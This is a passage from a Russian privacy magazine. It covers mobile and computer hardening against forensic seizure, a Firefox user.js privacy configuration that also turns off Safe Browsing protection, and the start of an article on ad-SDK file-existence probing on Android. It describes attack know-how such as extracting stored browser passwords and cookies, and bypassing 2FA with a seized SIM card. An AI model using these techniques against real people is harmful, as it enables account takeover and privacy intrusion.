ной оболочки глаза; обмануть такую систему трехмерной моделью головы
не удастся. Аналогич ные системы ста ли появляться во флагманских устрой‐
ствах Huawei, Xiaomi и многих других. В то же время в ряде устрой ств исполь‐
зуются гораздо более примитивные сис темы, основанные или на фотографии
с фронтальной камеры, или на двумерном фото с инфракрасного датчика.
Обмануть такие системы вполне возможно, иног да — очень просто. Как пра‐
вильно заметили в статье «Раз блокировка по лицу — не лучшая идея», подход
«Мой телефон уме ет все то же, что и твой iPhone, — и стоит в десять раз
меньше!» будет встречать ся все чаще.
  Особняком стоит правовой аспект разблокировки по лицу. В США был
создан ряд прецедентов, регулирующих возможности полиции разблокиро‐
вать устройство, сканируя лицо подозреваемого. Име ются как положитель‐
ные (разрешение на разбло кировку по лицу было выдано), так и отрицатель‐
ные (разрешение не было выдано или было выдано неправомерно) пре‐
цеденты, и благодаря им уста новлены достаточно четкие правовые рамки,
переходить которые полицейские в большинстве случаев не станут.
  В то же время в России мы неоднократно слышали об историях, когда
телефон «случайно» повора чивался в сторону задержанного, после чего «сам
собой»  разблокировался.  Доказать,  что  телефон  был  разблокирован
с нарушением правовых норм, в таких случаях очень тяжело: нательными
камерами, как в США, российские полицейские пока не оснащены.
  Использовать или не использовать раз блокировку по лицу — вопрос
открытый, и ответ на него лежит не только в технической области; решать
в любом случае тебе. Автор это го текста такую возможность использует.


Бе зопасность небезо пасного
А что можно сде лать, если у тебя на руках откровенно «дырявый» телефон
с разблокированным загрузчиком или переп рошитый ушлыми продавцами
«китаец»? В этом случае говорить о серь езной безопасности, конечно,
не приходится, но кое‐что ты сделать все‐таки сможешь.
  Первый и самый простой вариант: у тебя на руках телефон, загрузчик
которого разбло кирован (например, предыду щим владельцем). Часто подоб‐
ные ситуации осложняются тем, что на телефоне уста новлена кастомная про‐
шивка, есть root‐доступ, модифициро ван системный раздел или и вовсе
непонятно, что там тво рится. В большинстве случаев такой телефон можно
вернуть в «заводское» состояние, прошив его на заводскую прошивку (где
скачать, посоветуют на XDA или 4PDA), пос ле чего загрузчик можно заб‐
локировать командой fastboot oem lock. Особенно это рекомендуем про‐
делать с китайскими устройствами, на которые хитрые продавцы час то (чаще,
чем ты можешь себе предста вить!) уста навливают прошивки с самыми раз‐
нообразными сюрпризами.
  Обрати внимание: дан ная стра тегия не сработает со свежими телефо‐
нами Xiaomi, перепрошитыми с китайского стока на «глобальную» версию
MIUI. Если ты попробуешь заблокиро вать загрузчик на таком устройстве,
получишь «кирпич», вос становить который может быть очень и очень трудно.
Если все‐таки решишь попробовать — хотя бы заведи на телефоне Xiaomi Ac‐
count, чтобы впоследствии, если что‐то пой дет не так, ты мог воспользовать‐
ся утилитой Mi Unlock для разбло кировки загрузчика.
  Но что, если загрузчик нельзя заблокировать (так часто бывает на многих
китайских устройствах)? Зна чит, тебе не повезло. Впрочем, если ты приобрел
такое устройство, то, вероятно, безопасность — пос ледняя из проблем
такого телефона. Теоретически даже на таких устрой ствах будет работать
шифрование, которое не поз волит прос то так считать данные. На практике же
взлом таких устройств обычно не представляет никакой проблемы. Единс‐
твенное, что ты можешь попытать ся сделать, — нас троить Secure Startup;
в этом режиме ключ шифрования данных будет генерироваться на основе
кода блокировки. Достаточно длинный код блокировки увеличит вре мя,
которое потребуется на взлом.
   Что делать, если ты приобрел телефон, который ведет себя странно?
При малейшем подозрении на вредоносное ПО в прошивке зайди в про‐
фильную ветку на 4PDA. Вполне вероятно, что ты с такой проблемой не один
и на форуме уже есть подробные инс трукции по удалению или заморозке
мал вари.
  А что делать, если произво дитель не выпус кает обновле ний, а в прошивке
прочно прописались зловредные компоненты? Конечно, разумным поступком
было бы избавиться от такого устройства, но в реальном мире так мало кто
делает. Поэтому рекомендация: попробуй разблокировать загрузчик (хуже
уже не станет) и установить на телефон офи циальную сборку Lineage OS.
В официальных сборках Lineage (в отли чие от, например, Resurrection Remix)
все хорошо и с приватностью, и с шифрованием, и с обновлениями «по воз‐
духу». В зависимости от дос тупной для тво его устройства версии прошивки
может использоваться шифрование как FDE, так и FBE; в первом слу чае
рекомендуем настроить Secure Startup. Если же сборок Lineage нет или раз‐
блокировать загрузчик невоз можно, то даже ребенку я бы такой телефон
отдавать не стал.


ЕСЛИ ЗАБРАЛИ КОМПЬЮТЕР
Обсудив защищенность твоих данных в мобиль ном устройстве, поговорим
о том, как анализ компь ютера может повлиять на безопасность твоих мобиль‐
ных устройств. Если эксперт получил доступ к тво ему компьютеру, а пол‐
нодисковое шифрование (например, посредс твом BitLocker) ты не исполь‐
зуешь, то запуском прос той утилиты и одним‐дву мя ленивы ми кликами мышки
будут извлечены все логины и пароли от всех твоих учетных записей. Откуда?
Из базы данных твоего любимо го браузера: Chrome, Mozilla, Edge… Поль‐
зуешься менеджером паролей? Если раз работка тебя в качестве подозрева‐
емого представляет хоть какой‐то интерес, то к базе данных паролехранилки
попытаются подоб рать пароль (тут, впрочем, резуль тат не гарантирован).
   Что произойдет, когда пароли будут извлечены? В зависимос ти от того,
каким смартфоном ты пользуешь ся, эксперт запус тит еще одно приложение,
которое извлечет всю информа цию из облака Apple, Google или, к примеру,
Samsung. (В скобках: если ты пользуешься смартфоном Samsung, то знаешь
ли ты, что именно хранится в соответс твующем обла ке, даже если ты не вклю‐
чал его сознательно?)
   Если ты пользуешься iPhone, из обла ка мож но извлечь:
 • резервные копии (кстати, не всег да; если у тебя свежая версия iOS и акти‐
   вирована двухфакторная аутентифика ция, то резервную копию скачать
   не удастся. Впрочем, если у тебя оста лись старые резервные копии, соз‐
   данные устройствами с iOS 11 или старше, то их извлечь получится.
   Мораль: посмотри, что у тебя хра нится в обла ке, и удали ненужные резер‐
   вные копии!);
 • синхронизированные данные: контакты, заметки, календари, закладки
   браузера Safari и прочее;
 • фотографии (если у тебя включен iCloud Photo Library), в том числе недав‐
   но удаленные;
 • журнал звонков и историю бра узера;
 • некоторые данные карт;
 • если узнают код блокировки твоего телефона или пароль от компьюте ра
   Mac, то и все облачные пароли (iCloud Keychain) и данные «Здоровья»
   (журнал твоей повседневной активности), а также SMS и iMessage.

Пользуешься Android? Google собирает намного больше данных, чем Apple;
длиннее и список доступной для извлечения информации:
 • резервные копии и данные приложений (кстати, в Android именно в этой
   категории будут хранить ся журналы звонков, SMS, а также маркеры аутен‐
   тификации отдельных приложений);
 • синхронизированные данные: кален дари, контакты, заметки;
 • пароли Chrome (какой‐либо дополнительной защиты, как в iOS, для них
   не предусмотре но);
 • подробнейшая  история  местополо жения  за  последние  много  лет.
   Пожалуй, на этот пункт будут обращать внимание в первую очередь;
 • история браузера и поисковых запросов. Исследуется в обязательном
   порядке;
 • почта Gmail, которую можно использовать, например, для сброса пароля
   к другим учетным записям.

Исследование облака Google час то дает более интересный результат, чем
даже анализ самого смартфона, так как собираются данные не только с кон‐
кретного телефона, но и со всех других устройств (в том числе компьютеров),
в которых ты вошел в свой Google Account.
   Если у тебя телефон Samsung, то можно вытащить еще кое‐что из собс‐
твенного облака Samsung. Мы понимаем, что для многих читателей наличие
у Samsung собственного облачного сервиса ста нет сюрпризом, а то, что
в нем, оказывается, хра нят ся какие‐то данные (и ты с этим в какой‐то момент
успел согласиться), может сильно удивить. В обла ке Samsung можно найти:
 • резервные копии (интерес но, что Samsung сохраняет в облаке не только
   данные приложений, но и APK);
 • фотографии (если ты не приложил осоз нанных усилий, чтобы отключить
   синхронизацию фотог рафий в обла ко);
 • данные Samsung Health;
 • резервные копии часов и трекеров Samsung.

Пользователи смартфонов Xiaomi (а также дру гих устройств под управлением
MIUI) имеют возможность синхронизировать свои устройства с облаком Mi
Cloud (если смартфон «гло бальной» вер сии, то информация сохраняется
в дополнение к тому, что сохраняется в Google Account). В облаке Mi Cloud
можно найти следующее:
 • резервные копии. Здесь достаточно скудно: сохраняются APK и нас тройки
   телефона, но не сох раняются данные приложений;
 • контакты, SMS;
 • фотографии, если ты вклю чил синхрониза цию.

Как обезопасить себя от облачных атак? Самые распространенные советы
по безопасности, кочующие из одной статьи в дру гую, оказываются и самыми
бесполезными. Ты можешь выб рать длинный и сложный пароль, но извле‐
чение даже самого длинного пароля из встроенного в Chrome хранилища
займет те же миллисекунды, что и совсем корот кого. Ты можешь включить
двухфакторную аутентификацию, но обойти ее будет довольно просто, если
эксперт достанет из твоего телефо на SIM‐карту и использует ее для получе‐
ния одноразового кода. Более того, если твой браузер залогинен в твой
Google Account, можно вытащить cookie, содержащие маркеры аутентифика‐
ции, — в этом случае не нужен ни одноразовый код, ни пароль, ни даже логин.
Это не значит, что двухфакторная аутентифика ция бесполезна — она вполне
эффективна против попыток уда ленного взлома. Просто рассчитывать только
на эти меры, если работают гра мотные эксперты, нельзя.
  Помочь может многос лойная защита.
   Во‐первых, обеспечь физическую безопас ность компьюте ра, включив
шифрование системного диска через BitLocker. Кстати, убедись, что ключ
шифрования BitLocker Recovery Key не «утек» в облако OneDrive (проверить
можно тут) или не сох ранился в Active Directory.
   Если ты живешь в Рос сии, то прос то так взять и зашиф ровать системный
диск у тебя не получится. Для того что бы включить шифрование, тебе нужна
как минимум профессиональная редакция Windows и аппаратный модуль
доверенной загрузки TPM 2.0. Именно в аппаратном модуле дол жен хранить‐
ся сам ключ шифрования, при помощи которого будет зашифрован раздел.
Модули TPM 2.0 не получили сертификации ФСБ; соответственно, все про‐
дающиеся на территории РФ компь ютеры не должны включать этот модуль
по умол чанию, даже если он физически распаян на материнской плате. Вари‐
анты? Если есть возможность активировать TPM 2.0 в настрой ках BIOS —
сделай это и вклю чи BitLocker. Если такой воз можнос ти нет, то разрешить
шифрование системного раз дела при помощи BitLocker получится и без
аппаратного модуля. Сделать это можно вручную, отредактировав групповые
политики Windows. Подробнос ти — по ссылке.
  Следующий слой защиты — пароли для облачных учетных записей.
Для облачных сервисов Google, Apple, Samsung, Xiaomi используй уникальные
пароли, непохожие на все те, что записа ны в хранилище браузера. Запусти
свой любимый, не самый любимый и совсем нелюбимый браузеры и убедись,
что в их хранилище нет данных перечисленных выше учетных записей. Если
используешь Chrome — выйди из учетной записи Google. Сотри кеш и куки
браузера, после чего закрой все окна. Всё, на какое‐то время (пока ты снова
не войдешь в Google Account) ты защищен от облачного вектора атаки.
  Использование такой системы нез начительно повлияет на удобс тво пов‐
седневного использования, но существенно повысит безопасность.


Lockdown
У пользователей iPhone есть дополнительный фактор риска: файл lockdown,
он же — iTunes pairing record. Эти файлы создаются при подключении iPhone
или iPad к компьюте ру, на котором установлено приложение iTunes; они нужны
для того, чтобы при помощи iTunes мож но было синхронизировать устройство
с компьютером без пос тоянного ввода кода блокировки. С одной стороны,
наличие механизма pairing record — это удобство. С дру гой — уязвимость.
Так, инструменты «Элкомсофт» поз воляют исполь зовать файлы lockdown
для создания резервной копии телефона, даже если экран заблокирован (но
сам телефон был разбло кирован хотя бы раз с момента загрузки). Решение
GrayKey в тех же условиях и вовсе поз воляет соз дать пол ный образ файловой
системы (правда, пока только для iOS 11).
   Как защититься? С одной стороны, можно удалить файлы lockdown
с компьютера; на Windows 10 они находятся в папке C:\Users\<username>\
AppData\Roaming\Apple  Computer\MobileSync\Backup (если ты устанав‐
ливал iTunes с сайта Apple) или в папке C:\Users\<username>\Apple\Mo‐
bileSync\Backup (если ты исполь зуешь вер сию iTunes из Microsoft Store).
  А вот просто так удалить эти записи на iPhone нельзя; можно лишь сбро‐
сить все доверен ные записи сра зу через Settings → General → Reset → Reset
Location & Privacy. Кста ти, для сброса нужно будет ввести код блокировки.
Другой способ удалить доверенные записи — сброс настроек Reset Network
Settings. А вот Reset All Settings на записи доверия не влияет никак (зато уда‐
ляет пароль на резервную копию).
  Насколько  реальны  риски,  свя занные  с  анализом  компьютера?
По информации от самих полицейских, исследова ние компьютеров проводят
нечасто. Как правило, у полиции возникают следующие пре пятствия:
 • препятствия юридичес кого характера: имеющееся пос тановление раз‐
  решает досмотр и анализ улик, бывших у задержанного при себе (но
   не дает разрешения на обыск в квартире);
 • ограничения по времени: работа эксперта пос тавлена на поток. В рутин‐
   ных случаях у эксперта нет месяца, недели или даже нескольких дней, что‐
  бы подробнейшим обра зом проанализировать все дос тупные улики;
 • пароль к BitLocker чрезвычайно стойкий. Ата ки «в лоб» обре чены, если
   полиция не сможет извлечь готовый ключ шифрования посредством,
   к примеру, FireWire Attack;
 • поверхностная экспертиза: в результате строгих временных рамок содер‐
  жимое жесткого диска прос матривает ся на предмет впол не конкретных
  файлов (фото‐ и видеома териалы, переписка, базы данных мессендже‐
   ров);
 • даже если предпринима ется полный анализ, очень часто в кеше браузе‐
   ров не оказывается нужных паролей;
 • даже если нужные пароли есть, в обла ке подоз реваемого не оказывается
   резервных копий вооб ще или дос таточно свежих резервных копий. Даже
   для iOS это типичная ситуация: если оставить все нас тройки по умол‐
   чанию, то мизерные 5 Гбайт бес платного мес та в облаке в кратчайшие
   сроки будут забиты синхронизированными фотографиями. На резервные
   копии места уже не оста нется. А вот у пользователей Android — останется:
   как резервные копии, так и фотографии в «стандартном» качес тве не учи‐
   тываются в и без того достаточно щедрой кво те в 15 Гбайт.


ЗАКЛЮЧЕНИЕ
В этой статье мы подробно рассмотрели риски и настройки безопасности,
выходящие далеко за рамки стандартных советов «установить код блокиров‐
ки» и «вклю чить двухфакторную аутентифика цию». Надеемся, что понимание
рисков, связанных с теми или иными тво ими действиями и настройками,
поможет тебе адекватно оценить степень безопасности твоих данных — и,
возможно, укре пить слабые мес та без каких‐либо заметных неудобств
в работе устройства.
ПРИВАТНОСТЬ





                                                 Nik Zerof
                                                 xtahi0nix@gmail.com
  СТОРОЖЕВОЙ ЛИС

        КАК НАСТРОИТЬ FIREFOX
    ДЛЯ ПОВЫШЕНИЯ ПРИВАТНОСТИ





В последнее время бра узер Firefox претерпевал достаточно
значительные изменения, хорошие и не очень: это и переход
на движок Quantum, это и отказ от расширений типа XUL/XP‐
COM, и переход на WebExtensions, и еще масса других пре‐
образований. Что никак не изме нилось — это возможность
сделать из него прекрасный хакерский браузер, если нем‐
ного покрутить конфиги. Как и что крутить, мы обсудим
в этой статье.


             INFO

                       Quantum, новый движок  Firefox, предполагает
                       постепен ное обновление всех компонентов бра‐
                         узера, что бы увеличить скорость работы и умень‐
                      шить потребляемую память.



СОЗДАНИЕ «ПОРТАТИВНЫХ» НАСТРОЕК
Все интересные настройки Firefox делаются на служебной странице по адре‐
су about:conﬁg. Зайти сюда и поменять пару параметров — легко и удобно.
Но если говорить о тонкой настройке, то тут менять значения по одному ста‐
новится слегка утомительно.
   Как автоматизировать про цесс, не при бегая к сторонним утилитам? Очень
просто: создавай файл user.js и прописы вай все нас тройки туда. Далее
помещаем этот файл в каталог пользовательского профиля Firefox, который
в Windows находится по  пути C:\Users\[username]\AppData\Roaming\
Mozilla\Firefox\Profiles\[random].default. Фор мат записей в этом
файле прост: например, чтобы включить поддержку WebP, необходимо задать
параметру image.webp.enabled зна чение true. В файле нас троек это будет
выглядеть вот так:


user_pref("image.webp.enabled", true);

Другими словами, в шаблоне user_pref("...", …); идет параметр и его
значение. Итак, с файлом настро ек разоб рались, теперь приступим к пре‐
парированию браузера. Все настройки при меня лись к последней на момент
написания статьи версии браузера.


            WARNING

                       Учитывай,  что безопасность и приватность —
                         это всегда компромисс с удобством. Некоторые
                       настройки могут значительно ограничить функци‐
                       ональность сайтов, но сильно увеличить безопас‐
                        ность и приватность при серфинге. А что важ‐
                       нее — выбирать тебе.



ОТКЛЮЧАЕМ ВСЕ ЛИШНЕЕ
WebRTC и Pocket
Mozilla внедрила сервисы WebRTC и Pocket в Firefox и включила их по умол‐
чанию. Многим это не понравилось, и не прос то так: в Pocket нашли уяз‐
вимости, а WebRTC может допус кать утечку IP‐адреса при определенных
обстоятельствах. Давай отключим и то и дру гое! Сейчас и далее я привожу
готовые строки настроек, которые ты можешь копировать в файл user.js.


// Отключаем Pocket
user_pref("extensions.pocket.api", "");
user_pref("extensions.pocket.enabled", false);
user_pref("extensions.pocket.site", "");
user_pref("extensions.pocket.oAuthConsumerKey", "");
// Отключаем WebRTC
user_pref("media.peerconnection.enabled", false);
user_pref("media.peerconnection.ice.default_address_only", true);
user_pref("media.peerconnection.ice.no_host", true);
user_pref("media.peerconnection.ice.relay_only", true);
user_pref("media.peerconnection.ice.tcp", false);
user_pref("media.peerconnection.identity.enabled", false);
user_pref("media.peerconnection.turn.disable", true);
user_pref("media.peerconnection.use_document_iceservers", false);
user_pref("media.peerconnection.video.enabled", false);
user_pref("media.peerconnection.default_iceservers", "[]");


Ге оло кация
Отключаем доступ к геоло кации.


user_pref("geo.enabled", false);
user_pref("geo.provider.ms‐windows‐location", false);
user_pref("geo.wifi.uri", "");


Статистика использования браузе ра и раз личные метрики
Перекрываем сбор различных данных.


// Отключаем асинхронные запросы, используемые для аналитики
user_pref("beacon.enabled", false);
user_pref("browser.send_pings", false);
user_pref("browser.send_pings.require_same_host", false);
// Отключаем метрики производительности
user_pref("dom.enable_performance", false);
user_pref("dom.enable_performance_observer", false);
user_pref("dom.enable_performance_navigation_timing", false);
user_pref("browser.slowStartup.notificationDisabled", false);
user_pref("network.predictor.enabled", false);
user_pref("network.predictor.enable‐hover‐on‐ssl", false);
user_pref("network.prefetch‐next", false);
user_pref("network.http.speculative‐parallel‐limit", 0);
// Информация об установленных дополнениях
user_pref("extensions.getAddons.cache.enabled", false);


Отключаем доступ к датчикам
Если у тебя обычный ПК, а не планшет, к примеру, то выключаем доступ к дат‐
чикам.


user_pref("device.sensors.enabled", false);
user_pref("device.sensors.orientation.enabled", false);
user_pref("device.sensors.motion.enabled", false);
user_pref("device.sensors.proximity.enabled", false);
user_pref("device.sensors.ambientLight.enabled", false);


Останавливаем фин герприн тинг
Эти настройки говорят бра узеру сопротивлять ся идентификации.


user_pref("dom.webaudio.enabled", false);
user_pref("privacy.resistFingerprinting", true);


Пе рек рываем информацию о сетевом соединении
user_pref("dom.netinfo.enabled", false);
user_pref("dom.network.enabled", false);


Отключаем использование устройств и передачу медиа
Отключаем использование через бра узер камер, микрофонов, гей мпадов,
очков виртуальной реальнос ти и вместе с устройствами — передачу раз‐
личного медиаконтента, типа скриншотов и прочего. Так же выключаем рас‐
познавание речи.


user_pref("dom.gamepad.enabled", false);
user_pref("dom.gamepad.non_standard_events.enabled", false);
user_pref("dom.imagecapture.enabled", false);
user_pref("dom.presentation.discoverable", false);
user_pref("dom.presentation.discovery.enabled", false);
user_pref("dom.presentation.enabled", false);
user_pref("dom.presentation.tcp_server.debug", false);
user_pref("media.getusermedia.aec_enabled", false);
user_pref("media.getusermedia.audiocapture.enabled", false);
user_pref("media.getusermedia.browser.enabled", false);
user_pref("media.getusermedia.noise_enabled", false);
user_pref("media.getusermedia.screensharing.enabled", false);
user_pref("media.navigator.enabled", false);
user_pref("media.navigator.video.enabled", false);
user_pref("media.navigator.permission.disabled", true);
user_pref("media.video_stats.enabled", false);
user_pref("dom.battery.enabled", false);
user_pref("dom.vibrator.enabled", false);
user_pref("dom.vr.require‐gesture", false);
user_pref("dom.vr.poseprediction.enabled", false);
user_pref("dom.vr.openvr.enabled", false);
user_pref("dom.vr.oculus.enabled", false);
user_pref("dom.vr.oculus.invisible.enabled", false);
user_pref("dom.vr.enabled", false);
user_pref("dom.vr.test.enabled", false);
user_pref("dom.vr.puppet.enabled", false);
user_pref("dom.vr.osvr.enabled", false);
user_pref("dom.vr.external.enabled", false);
user_pref("dom.vr.autoactivate.enabled", false);
user_pref("media.webspeech.synth.enabled", false);
user_pref("media.webspeech.test.enable", false);
user_pref("media.webspeech.synth.force_global_queue", false);
user_pref("media.webspeech.recognition.force_enable", false);
user_pref("media.webspeech.recognition.enable", false);


Отключаем телеметрию и отправку отче тов
Браузер собирает телеметричес кие данные и сигнализирует раз работчикам
о падениях компонентов. Для повышения анонимности это можно отключить.


user_pref("toolkit.telemetry.archive.enabled", false);
user_pref("toolkit.telemetry.bhrPing.enabled", false);
user_pref("toolkit.telemetry.cachedClientID", "");
user_pref("toolkit.telemetry.firstShutdownPing.enabled", false);
user_pref("toolkit.telemetry.hybridContent.enabled", false);
user_pref("toolkit.telemetry.newProfilePing.enabled", false);
user_pref("toolkit.telemetry.previousBuildID", "");
user_pref("toolkit.telemetry.reportingpolicy.firstRun", false);
user_pref("toolkit.telemetry.server", "");
user_pref("toolkit.telemetry.server_owner", "");
user_pref("toolkit.telemetry.shutdownPingSender.enabled", false);
user_pref("toolkit.telemetry.unified", false);
user_pref("toolkit.telemetry.updatePing.enabled", false);
user_pref("datareporting.healthreport.infoURL", "");
user_pref("datareporting.healthreport.uploadEnabled", false);
user_pref("datareporting.policy.dataSubmissionEnabled", false);
user_pref("datareporting.policy.firstRunURL", "");
user_pref("browser.tabs.crashReporting.sendReport", false);
user_pref("browser.tabs.crashReporting.email", false);
user_pref("browser.tabs.crashReporting.emailMe", false);
user_pref("breakpad.reportURL", "");
user_pref("security.ssl.errorReporting.automatic", false);
user_pref("toolkit.crashreporter.infoURL", "");
user_pref("network.allow‐experiments", false);
user_pref("dom.ipc.plugins.reportCrashUR", false);
user_pref("dom.ipc.plugins.flash.subprocess.crashreporter.enabled",
false);


Настраиваем информацию для поиска
Приводим поиск браузера в «стандартное» состояние — без поправок
на наше местоположение.


user_pref("browser.search.geoSpecificDefaults", false);
user_pref("browser.search.geoSpecificDefaults.url", "");
user_pref("browser.search.geoip.url", "");
user_pref("browser.search.region", "US");
user_pref("browser.search.suggest.enabled", false);
user_pref("browser.search.update", false);

Раз бираемся с пуш‑уве домлениями
Пуш‐уведомления могут работать даже тог да, когда ты закрыл страницу.


user_pref("dom.push.enabled", false);
user_pref("dom.push.connection.enabled", false);
user_pref("dom.push.serverURL", "");

А теперь не могут.


Убираем утеч ки DNS
Здесь убираем возможную утечку DNS по IPv6, отключаем упреждающую
отправку DNS и настраиваем DoH — DNS over HTTPS.


user_pref("network.dns.disablePrefetch", true);
user_pref("network.dns.disableIPv6", true);
user_pref("network.security.esni.enabled", true);
user_pref("network.trr.mode", 2);
user_pref("network.trr.uri", "https://cloudflare‐dns.com/dns‐query");


Отключаем перенаправле ния
user_pref("network.captive‐portal‐service.enabled", false);
user_pref("network.captive‐portal‐service.maxInterval", 0);
user_pref("captivedetect.canonicalURL", "");


Пре секаем слив дан ных на серверы Google
С настройками по умолчанию Google дол жен защищать тебя от вирусов
и фишинга. Это зачастую полезная функция, но если ты знаешь, что ты дела‐
ешь, и не хочешь, чтобы Google за этим наб людал, то можешь и избавиться
от этого пристального внимания.


user_pref("browser.safebrowsing.allowOverride", false);
user_pref("browser.safebrowsing.blockedURIs.enabled", false);
user_pref("browser.safebrowsing.downloads.enabled", false);
user_pref("browser.safebrowsing.downloads.remote.block_dangerous",
false);
user_pref("browser.safebrowsing.downloads.remote.block_dangerous
_host", false);
user_pref("browser.safebrowsing.downloads.remote.block_potential
ly_unwanted", false);
user_pref("browser.safebrowsing.downloads.remote.block_uncommon",
false);
user_pref("browser.safebrowsing.downloads.remote.enabled", false);
user_pref("browser.safebrowsing.malware.enabled", false);
user_pref("browser.safebrowsing.phishing.enabled", false);
user_pref("browser.safebrowsing.downloads.remote.url", "");
user_pref("browser.safebrowsing.provider.google.advisoryName", "");
user_pref("browser.safebrowsing.provider.google.advisoryURL", "");
user_pref("browser.safebrowsing.provider.google.gethashURL", "");
user_pref("browser.safebrowsing.provider.google.reportMalwareMi
stakeURL", "");
user_pref("browser.safebrowsing.provider.google.reportPhishMist
akeURL", "");
user_pref("browser.safebrowsing.provider.google.reportURL", "");
user_pref("browser.safebrowsing.provider.google.updateURL", "");
user_pref("browser.safebrowsing.provider.google4.advisoryName", "");
user_pref("browser.safebrowsing.provider.google4.advisoryURL", "");
user_pref("browser.safebrowsing.provider.google4.dataSharingURL", "")
;
user_pref("browser.safebrowsing.provider.google4.gethashURL", "");
user_pref("browser.safebrowsing.provider.google4.reportMalwareMi
stakeURL", "");


Отключаем DRM
...просто потому, что можем!


user_pref("browser.eme.ui.enabled", false);
user_pref("media.eme.enabled", false);

Итак, мы рассмотрели некоторые базовые нас тройки браузе ра  Firefox,
которые помогут тебе не делить ся ни с кем своими данными. Как видишь,
без этих настро ек браузер фактичес ки следит за каждым шагом, собирает
кучу метрик и отправляет их туда и сюда. Раз все это можно отключить,
почему бы не сделать это го?
   Конечно, этот гайд нельзя наз вать абсолютно полным — я уве рен, что
в сотнях настро ек браузера найдется что‐то еще, что можно оптимизировать
и улучшить, но основную массу собира емых данных мы все‐таки перекрыли.
Еще надо помнить, что от версии к версии названия настроек могут меняться,
какие‐то могут уходить, а дру гие — приходить, поэтому файл нужно будет
время от времени обновлять.


10 полез ных пла гинов для Firefox
Как бы мы ни настраивали браузер, кое‐каких вещей можно добиться только
плагинами. Они тоже могут неп лохо помочь с укреплением нашей безопас‐
ности при серфинге в интернете. Вот некоторые из тех, что я использую
и считаю необходимыми.
 1. Privacy Possum — блокиру ет различные методы слежения: рефере ры,
   заголовки ETag, сторон ние куки, портит данные фингерпринта.





 2. uBlock Origin — отличный бло кировщик рекламы и не только. Содержит
   обширные списки бло кировки, единс твенный нюанс — львиную долю
   списков блокировки нужно будет активировать самостоятельно в нас трой‐
    ках, потому что они отключены по умолчанию.





 3. uMatrix — расширение, раз работанное автором uBlock Origin. Представ‐
   ляет собой мощный блокировщик запросов браузера, а в связке с uBlock
   становится мощ ным средством против рекламы и прочей мишуры. Однако
   требует настрой ки практически под каждый сайт.





 4. Nano Defender — хорошее дополнение к блокировщику рекламы — плагин
   противодействует антиадблокерам.
 5. Decentraleyes — полез ный пла гин, который препятс твует отслеживанию
   через CDN (Content Delivery Network).





 6. Facebook Container — плагин, разработанный в Mozilla. Пытается оста‐
   новить слежку со стороны Facebook.





 7. Google search link ﬁx — расширение, которое чистит поисковую выдачу
   Yandex и Google, не поз воляя поисковику собирать статистику кликов
   по ссылкам в выдаче.





 8. NoScript — популярное рас ширение, которое блокирует скрипты на сай‐
    тах. Очень полезно, потому что как раз скрипты часто нарушают аноним‐
   ность.
 9. HTTPS Everywhere — автоматичес ки переключает соеди нение на HTTPS,
   даже когда это явно не было указано в адресной строке.





10. Privacy Badger — еще одно рас ширение от Фонда электронных рубежей,
   которое препятствует слежке со сто роны сайтов.
ПРИВАТНОСТЬ

 ПРИЦЕЛ
    НА ЛИЧНЫЕ ДАННЫЕ





       ЧТО МОБИЛЬНАЯ РЕКЛАМА
         МОЖЕТ РАЗУЗНАТЬ
     О ПОЛЬЗОВАТЕЛЕ ANDROID



В Google Play приложений, которые будут
тебе показывать рекламу, боль ше 40%. Так
что если у тебя смартфон на Android и ты
пользуешься мобильными приложениями,
то, скорее всего, ты понимаешь, о чем         Владимир Карев                                                                                Инженер с 50‐летним
речь.  Используя  такие  приложения,  ты        стажем.SpectrumСвой первыйспаял  ZX
запускаешь  встроенный  в  них  AdSDK,           vladimir.tech@mail.ruсамостоятельно
который подгружает со своего сервера
рек ламные  объявления. И  чаще  все го
это объявления MRAID,  которые  через
JavaScript обращаются к нативным фун кци‐
ям    твоего   смартфо на:    например,
при  помощи  mraid.storePicture()
кешируют картинки во внешнем хра нилище.
Звучит небезопас но, правда?


Бизнес‐логика AdSDK часто непрозрачна для раз работчика, который встра‐
ивает его в свое мобиль ное приложение. Программный код AdSDK работает
с теми же привиле гиями,  что и при ложение‐носитель. Если носителю
какие‐то спе циальные разрешения не нуж ны, но они нужны AdSDK — носите‐
лю придется запросить их. Любой ува жающий себя AdSDK затребует от тебя
доступ к ID смартфона и геоло кации, чтобы показывать тебе релевантные
объявления.
  AdSDK‐провайдеры вынуждены мириться с небезопасностью по многим
причинам. Несколько самых очевидных:
 • между рекламодателем и тво им смартфоном может быть непредска‐
   зуемое число промежу точных звень ев;
 • объявления для показа выбираются динами чес ки;
 • на сегодняшний день не существу ет инс трументов для гарантированной
   дезинфекции JS‐кода.

Поэтому AdSDK‐провайдеры рас сматрива ют каждое объ явление как потен‐
циально злонамеренное и используют механизм защиты, который запрещает
программному коду объявлений читать чужие фай лы из внешнего хранилища
твоего смартфо на. Этот запрет реализует ся в два шага.
 1. AdSDK помещает программный код каждого объ явления в изолированный
   экземпляр встроенного бра узера WebView и ограничивает набор раз‐
   решений, которыми этот экземпляр может пользоваться.
 2. Доступ программного кода объявления к внешнему миру, в частности
   к локальным файлам внешнего хра нилища твоего смартфона, регламен‐
   тируется в соот ветствии с концепцией SOP — чтобы программный код
  объявления не мог читать из внешнего хра нили ща чужие файлы.


ИМПРОВИЗИРОВАННЫЙ ОРАКУЛ
При  этом  программному  коду  объявления  разрешается  пользоваться
«импровизированным ора кулом»: обращаться  к внешнему хранилищу  с,
казалось бы, безобидным вопросом: «А существу ет ли у тебя файл X?»
  Но даже наличие определенных файлов может рассказать, какие лекарс‐
тва ты принимаешь, какой у тебя круг общения и что ты за человек.


             INFO

                     Возможность создания  такого оракула с  тех‐
                       нической точки зрения не нарушает SOP, сог‐
                       ласно четверто му разделу RFC6454. Дело в том,
                         что этот оракул злоупотребляет тонким, но фун‐
                     даментальным  различием  между  моделями
                       безопасности,   реализованными   в  обычных
                       веб‐приложениях и в мобильных приложениях.


Тон кое раз личие в моделях безопасности веб‑приложе ний
и мобильных приложе ний
В обычных веб‐приложениях доступ  к кросс‐доменным ресурсам коор‐
динируется через CORS‐запросы — совместными усилиями пользователь‐
ского веб‐браузера и уда ленного веб‐сервера. Фактичес ки немногие сов‐
ременные веб‐сайты смогли бы работать, если бы SOP напрочь запретил
возможность исполь зования кросс‐доменных ресурсов. Эта ключевая осо‐
бенность  веб‐программирования  выглядит  довольно‐таки  безобидной,
по крайней мере в своем первоначальном веб‐контексте. Но она имеет инте‐
ресные последствия для конфиденциальности, когда используется в мобиль‐
ном контексте. В случае с внешним хранилищем тво его смартфона, где фай‐
